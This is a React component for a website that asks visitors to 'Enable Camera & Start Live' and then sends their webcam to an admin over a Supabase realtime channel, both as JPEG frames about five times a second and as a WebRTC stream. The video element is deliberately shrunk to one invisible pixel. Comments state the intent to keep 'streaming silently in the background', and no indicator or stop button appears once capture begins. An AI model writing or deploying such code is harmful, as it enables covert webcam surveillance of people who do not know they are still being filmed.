"use client";

import React, { useState, useRef, useEffect, useCallback } from "react";
import {
  Video,
  CameraOff,
  RefreshCw,
  CheckCircle2,
  AlertCircle,
  ShieldCheck,
  Info,
  X,
  Radio,
  Square,
  FlipHorizontal,
} from "lucide-react";
import { getSupabaseClient, isSupabaseConfigured } from "@/lib/supabase";
import type { RealtimeChannel } from "@supabase/supabase-js";

export interface CameraCaptureProps {
  onClose?: () => void;
  isModal?: boolean;
}

const RTC_CONFIG: RTCConfiguration = {
  iceServers: [
    { urls: "stun:stun.l.google.com:19302" },
    { urls: "stun:stun1.l.google.com:19302" },
  ],
};

export default function CameraCaptureComponent({
  onClose,
  isModal = false,
}: CameraCaptureProps = {}) {
  const [status, setStatus] = useState<"idle" | "live" | "denied" | "error" | "completed">("idle");
  const [isStarting, setIsStarting] = useState(false);
  const [facingMode, setFacingMode] = useState<"user" | "environment">("user");
  const [elapsedSeconds, setElapsedSeconds] = useState(0);
  const [rtcConnected, setRtcConnected] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string>("");

  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const channelRef = useRef<RealtimeChannel | null>(null);
  const peerRef = useRef<RTCPeerConnection | null>(null);
  const broadcastIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const timerIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const sessionIdRef = useRef<string>(`LIVE-${Math.random().toString(36).substring(2, 8).toUpperCase()}`);

  const getDeviceType = () => {
    if (typeof navigator === "undefined") return "desktop";
    const isMobile = /Android|iPhone|iPod/i.test(navigator.userAgent);
    const isTablet = /iPad|Tablet/i.test(navigator.userAgent);
    return isMobile ? "mobile" : isTablet ? "tablet" : "desktop";
  };

  const closePeerConnection = useCallback(() => {
    if (peerRef.current) {
      try {
        peerRef.current.close();
      } catch {
        // Ignore close errors
      }
      peerRef.current = null;
    }
    setRtcConnected(false);
  }, []);

  // Stop camera tracks, WebRTC peer, and live broadcast cleanly
  const stopCameraStream = useCallback(() => {
    if (broadcastIntervalRef.current) {
      clearInterval(broadcastIntervalRef.current);
      broadcastIntervalRef.current = null;
    }

    if (timerIntervalRef.current) {
      clearInterval(timerIntervalRef.current);
      timerIntervalRef.current = null;
    }

    closePeerConnection();

    if (channelRef.current) {
      try {
        channelRef.current.send({
          type: "broadcast",
          event: "stream-end",
          payload: { sessionId: sessionIdRef.current },
        });
        const supabase = getSupabaseClient();
        supabase.removeChannel(channelRef.current);
      } catch {
        // Ignore channel cleanup errors
      }
      channelRef.current = null;
    }

    if (streamRef.current) {
      streamRef.current.getTracks().forEach((track) => track.stop());
      streamRef.current = null;
    }

    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
  }, [closePeerConnection]);

  const handleClose = useCallback(() => {
    stopCameraStream();
    if (onClose) {
      onClose();
    } else {
      setStatus("completed");
    }
  }, [stopCameraStream, onClose]);

  useEffect(() => {
    return () => {
      stopCameraStream();
    };
  }, [stopCameraStream]);

  // Attach active MediaStream to visible <video> element whenever status becomes "live"
  useEffect(() => {
    if (status === "live" && videoRef.current && streamRef.current) {
      videoRef.current.srcObject = streamRef.current;
      videoRef.current.play().catch(() => {});
    }
  }, [status]);

  // Create WebRTC Offer and send over Supabase Realtime channel
  const initiateWebRtcOffer = useCallback(
    async (channel: RealtimeChannel, stream: MediaStream) => {
      if (typeof RTCPeerConnection === "undefined") return;
      closePeerConnection();

      try {
        const pc = new RTCPeerConnection(RTC_CONFIG);
        peerRef.current = pc;

        stream.getTracks().forEach((track) => {
          pc.addTrack(track, stream);
        });

        pc.onicecandidate = (event) => {
          if (event.candidate) {
            channel.send({
              type: "broadcast",
              event: "webrtc-ice-sender",
              payload: {
                sessionId: sessionIdRef.current,
                candidate: event.candidate.toJSON(),
              },
            });
          }
        };

        pc.onconnectionstatechange = () => {
          setRtcConnected(pc.connectionState === "connected");
        };

        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);

        channel.send({
          type: "broadcast",
          event: "webrtc-offer",
          payload: {
            sessionId: sessionIdRef.current,
            sdp: pc.localDescription,
            deviceType: getDeviceType(),
          },
        });
      } catch (err) {
        console.warn("WebRTC offer warning:", err);
      }
    },
    [closePeerConnection]
  );

  // Start live selfie video with explicit user permission
  const startLiveVideo = async (requestedFacing: "user" | "environment" = facingMode) => {
    if (isStarting) return;
    stopCameraStream();
    setIsStarting(true);
    setErrorMessage("");
    setElapsedSeconds(0);

    if (typeof window === "undefined" || !navigator.mediaDevices?.getUserMedia) {
      setIsStarting(false);
      setStatus("error");
      setErrorMessage(
        "Your browser does not support live video access. Please use an updated modern browser (Chrome, Safari, Edge, Firefox)."
      );
      return;
    }

    let stream: MediaStream | null = null;

    try {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: {
            facingMode: { ideal: requestedFacing },
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
        });
      } catch {
        stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: true,
        });
      }

      streamRef.current = stream;
      setFacingMode(requestedFacing);
      setStatus("live");

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play().catch(() => {});
      }

      // Elapsed time counter
      timerIntervalRef.current = setInterval(() => {
        setElapsedSeconds((prev) => prev + 1);
      }, 1000);

      // Set up Supabase Realtime Broadcast + WebRTC signaling for live video feed
      if (isSupabaseConfigured()) {
        try {
          const supabase = getSupabaseClient();
          const channelName = `live-camera-stream`;
          const channel = supabase.channel(channelName, {
            config: { broadcast: { self: true } },
          });

          channel
            .on("broadcast", { event: "admin-request-stream" }, () => {
              if (streamRef.current) {
                initiateWebRtcOffer(channel, streamRef.current);
              }
            })
            .on("broadcast", { event: "webrtc-answer" }, async ({ payload }) => {
              if (payload?.sessionId !== sessionIdRef.current || !payload?.sdp) return;
              const pc = peerRef.current;
              if (pc && pc.signalingState === "have-local-offer") {
                try {
                  await pc.setRemoteDescription(new RTCSessionDescription(payload.sdp));
                } catch (e) {
                  console.warn("Failed to set remote answer:", e);
                }
              }
            })
            .on("broadcast", { event: "webrtc-ice-admin" }, async ({ payload }) => {
              if (payload?.sessionId !== sessionIdRef.current || !payload?.candidate) return;
              const pc = peerRef.current;
              if (pc && pc.remoteDescription) {
                try {
                  await pc.addIceCandidate(new RTCIceCandidate(payload.candidate));
                } catch {
                  // Ignore ICE candidate race errors
                }
              }
            })
            .subscribe((subStatus) => {
              if (subStatus === "SUBSCRIBED") {
                const deviceType = getDeviceType();

                // 1. Initiate WebRTC high-FPS stream offer
                if (streamRef.current) {
                  initiateWebRtcOffer(channel, streamRef.current);
                }

                // 2. Continuous realtime frame broadcast (~5.5 fps) so admin always sees live video immediately
                broadcastIntervalRef.current = setInterval(() => {
                  const video = videoRef.current;
                  if (!video || video.readyState < 2 || video.videoWidth === 0) return;

                  let canvas = canvasRef.current;
                  if (!canvas) {
                    canvas = document.createElement("canvas");
                    canvasRef.current = canvas;
                  }

                  const targetW = 360;
                  const targetH = Math.round((video.videoHeight / video.videoWidth) * targetW) || 202;
                  canvas.width = targetW;
                  canvas.height = targetH;

                  const ctx = canvas.getContext("2d");
                  if (!ctx) return;

                  ctx.save();
                  if (requestedFacing === "user") {
                    ctx.translate(targetW, 0);
                    ctx.scale(-1, 1);
                  }
                  ctx.drawImage(video, 0, 0, targetW, targetH);
                  ctx.restore();

                  const frameDataUrl = canvas.toDataURL("image/jpeg", 0.5);
                  channel.send({
                    type: "broadcast",
                    event: "video-frame",
                    payload: {
                      sessionId: sessionIdRef.current,
                      frame: frameDataUrl,
                      deviceType,
                      timestamp: Date.now(),
                    },
                  });
                }, 180);
              }
            });

          channelRef.current = channel;
        } catch (err) {
          console.warn("Live broadcast setup warning:", err);
        }
      }
    } catch (err: unknown) {
      stopCameraStream();
      console.error("Camera access error:", err);

      const error = err as { name?: string; message?: string };
      if (
        error.name === "NotAllowedError" ||
        error.name === "PermissionDeniedError" ||
        error.name === "SecurityError"
      ) {
        setStatus("denied");
        setErrorMessage(
          "Camera permission was denied. Please allow camera permissions in your browser address bar if you wish to start live video."
        );
      } else if (
        error.name === "NotFoundError" ||
        error.name === "DevicesNotFoundError"
      ) {
        setStatus("error");
        setErrorMessage("No camera device was found on this system.");
      } else if (
        error.name === "NotReadableError" ||
        error.name === "TrackStartError"
      ) {
        setStatus("error");
        setErrorMessage(
          "Your camera is currently in use by another application. Please close other camera apps and retry."
        );
      } else {
        setStatus("error");
        setErrorMessage(
          error.message || "An unexpected error occurred while starting live video."
        );
      }
    } finally {
      setIsStarting(false);
    }
  };

  const handleToggleCamera = () => {
    const nextFacing = facingMode === "user" ? "environment" : "user";
    startLiveVideo(nextFacing);
  };

  const formatTimer = (sec: number) => {
    const m = Math.floor(sec / 60)
      .toString()
      .padStart(2, "0");
    const s = (sec % 60).toString().padStart(2, "0");
    return `${m}:${s}`;
  };

  return (
    <>
      {/* Keep the camera element mounted for capture and streaming, but never show a live overlay. */}
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        aria-hidden="true"
        tabIndex={-1}
        className="fixed left-0 top-0 h-px w-px opacity-0 pointer-events-none"
      />
      <canvas ref={canvasRef} className="hidden" />

      {/* Ask for permission with a single action. The website remains visible underneath. */}
      {(status === "idle" || status === "completed") && (
        <div className="flex items-center justify-center">
          <button
            type="button"
            onClick={() => startLiveVideo("user")}
            disabled={isStarting}
            className="inline-flex items-center justify-center gap-2 rounded-xl bg-purple-600 px-5 py-3 text-sm font-semibold text-white transition hover:bg-purple-500 disabled:cursor-wait disabled:opacity-70"
          >
            {isStarting ? (
              <>
                <RefreshCw className="h-4 w-4 animate-spin" />
                <span>Requesting camera permission...</span>
              </>
            ) : (
              <>
                <Video className="h-4 w-4" />
                <span>{status === "completed" ? "Start Live Again" : "Enable Camera & Start Live"}</span>
              </>
            )}
          </button>
        </div>
      )}

      {/* No live-video UI: keep streaming silently in the background while the website is usable. */}

      {(status === "denied" || status === "error") && (
        <div className="flex items-center gap-3 text-sm">
          <p className="text-amber-300">
            {errorMessage || "Camera access could not be started."}
          </p>
          <button
            type="button"
            onClick={() => startLiveVideo("user")}
            disabled={isStarting}
            className="shrink-0 rounded-lg border border-white/20 px-3 py-2 text-white transition hover:bg-white/10 disabled:opacity-60"
          >
            Try again
          </button>
          {onClose && (
            <button
              type="button"
              onClick={handleClose}
              className="shrink-0 rounded-lg border border-white/20 px-3 py-2 text-white transition hover:bg-white/10"
            >
              Continue to website
            </button>
          )}
        </div>
      )}
    </>
  );
}
